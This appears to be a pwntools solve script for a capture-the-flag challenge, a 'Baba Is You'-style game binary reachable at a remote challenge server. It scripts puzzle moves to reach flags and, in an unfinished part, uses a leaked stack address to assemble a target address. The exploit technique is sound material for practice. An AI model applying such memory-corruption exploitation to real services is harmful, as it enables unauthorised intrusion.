from pwn import *
import warnings

warnings.simplefilter("ignore", category=BytesWarning)
context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("game-distr.out")

KEKE_SYMBOL = b"\xe2\x8c\xa5".decode()

p = None
def start():
	global p
	with context.local(log_level="error"):
		if p:
			p.close()
		if args.REMOTE:
			p = remote("184.72.87.9", 8011)
		else:
			# p = elf.process()
			p = elf.process(env={"LD_PRELOAD":"./preload.so"})

# gdb.attach(p)
# pause()

def recv_board():
	p.recvuntil(b"hacker is u")
	p.recvline()
	p.recvline()
	res = b""
	for i in range(32):
		res += p.recvline()
	p.recvline()
	return res.decode()

def move(direction):
	p.sendline(direction)
	return recv_board()

def move_all(moves):
	return list(map(move, list(moves)))[-1]

def get_keke_pos(board):
	for i in range(0x20):
		for j in range(0x20):
			if get_board_cell(board, i, j) == KEKE_SYMBOL:
				return (i, j)
	return None

def get_board_cell(board, x, y):
	return board.strip().splitlines()[y][2 * x + 1]

# go towards dir until you are above the character c
def go_above(board, pos, c, dir):
	pos = list(pos)
	while get_board_cell(board, pos[0], pos[1] + 1) != c:
		board = move(dir)
		pos[0] += (-1 if dir == "a" else 1)
	return (board, pos)

def get_flag0():
	start()
	recv_board()
	print(move_all("d" * 12 + "s" * 6 + "dassdw"))	# kekeispush => kekeisu
	print(move_all("a" * 15 + "s" * 8))	# get baba and keke in the same cell
	print(move_all("w" + "d" * 17 + "s" * 2))	# reach the exit of the first closed area
	p.sendline("s")	# move to the first flag cell
	log.success("flag0 = " + repr(p.recvline()))

def get_flag1():
	while True:
		start()
		stack_leak = int(recv_board().splitlines()[23][20:56].replace(" ", ""), 16)
		if ("c" in hex(stack_leak) and hex(stack_leak).count("6") >= 2):
			break
		log.failure("stack leak does not have necessary characters")
	log.success("stack_leak = " + hex(stack_leak))
	
	print(move_all("d" * 12 + "s" * 6 + "dassdw"))	# kekeispush => kekeisu
	print(move_all("a" * 15 + "s" * 8))	# join baba & keke
	print(move_all("d" * 8 + "w" * 3 + "wsddwa"))	# cloudispush => cloudisu
	print(move_all("sww"))	# clean extra clouds
	print(move_all("ss" + "d" * 8 + "s" * 5))	# escape first closed area
	print(move_all("a" * 11 + "ss"))	# disable 'XatY' phrase for now
	print(move_all("ww" + "d" * 13 + "w" * 18 + "d" * 5 + "s" * 2))	# fix digitispush
	print(move_all("wwaaa" + "s" * 24))
	print(move_all("wddawwds"))	# align digits 4 & 8
	print(move_all("a" * 10 + "w"))	# stop controlling the cloud
	# print(move_all("d" * 10 + "w" * 11 + "dassdw"))	# digitispush => digitisu
	print(move_all("d" * 12 + "w" * 11 + "adssaw"))
	print(move_all("dssssd"))	# bring digit 8 out of first area
	print(move_all("w" * 5 + "dwa"))	# stop controlling digits
	return
	print(move_all("waw" + "daw" * 7))	# fixing digitispush again
	print(move_all("s" * 13 + "w" * 13 + "aa" + "s" * 14 + "d" * 3))
	print(move_all("awwwd" + "s" * 4 + "asdsd" + "w" * 5))	# finished fixing digitispush
	board = move_all("s" * 8 + "a" * 16 + "wwdw" + "d" * 15)	# push top row of address letters to the right
	print(board)
	
	# push 660 down so we can build our target address
	pos = list(get_keke_pos(board))
	log.info("keke @ " + str(pos))
	board, pos = go_above(board, pos, "0", "a")
	board = move_all("ssww")
	board, pos = go_above(board, pos, "6", "a")
	board = move_all("ssww")
	board, pos = go_above(board, pos, "6", "a")
	board = move_all("ssww")
	print(board)
	
	# push some digits to the right
	board = move_all("a" * (pos[0] - 13) + "s")
	print(board)
	while (get_board_cell(board, 24, 22) == " "):
		board = move("d")
	print(board)
	
	# push a 'c' character down to the last row
	pos = get_keke_pos(board)
	board, pos = go_above(board, pos, "c", "a")
	print(board)
	
	# push the '8' digit down to the bottom right
	board = move_all("s" * 5 + "w" * 6 + "d" * 20 + "w")
	pos = get_keke_pos(board)
	board, pos = go_above(board, pos, "8", "d")
	print(move_all("s" * 7 + "asdddd"))

	print(move_all("w" + "a" * 30 + "s" + "d" * 30))	# move the 'c' next to '8'
	print(move_all("a" * 30 + "w" * 6 + "d" + "s" * 5 + "as" + "d" * 30))	# move 'b' next to 'c8'
	
	# move '660' next to 'bc8' with respect to x axis
	board = move_all("a" * 13 + "w" * 4)
	while get_board_cell(board, 25, 24) == " ":
		board = move("d")
	print(board)
	# bring '660' down next to 'bc8'
	print(move_all(("wd" + "s" * 4 + "w" * 3) * 3))

	print(move_all("a" * 13 + "ww" + "d" * 20))	# go to the digits row on the right
	print(move_all("wdsasdddddd"))	# make the row of digits shorter
	
	# move below the 'x' letter
	board = move_all("a" * 5 + "w")
	pos = get_keke_pos(board)
	print(move_all("a" * (pos[0] - 12)))

	print(move_all("saawwd"))	# move next to 'x'
	print(move_all("d" * 10))	# push the 'x' right
	print(move_all("sddwwa"))	# move over 'x'
	print(move_all("s" * 7))	# push the 'x' down
	print(move_all("w" * 6 + "a" * 11))	# move above '0'
	print(move_all("s" * 6 + "as" + "d" * 10))

# get_flag0()
get_flag1()

p.interactive()
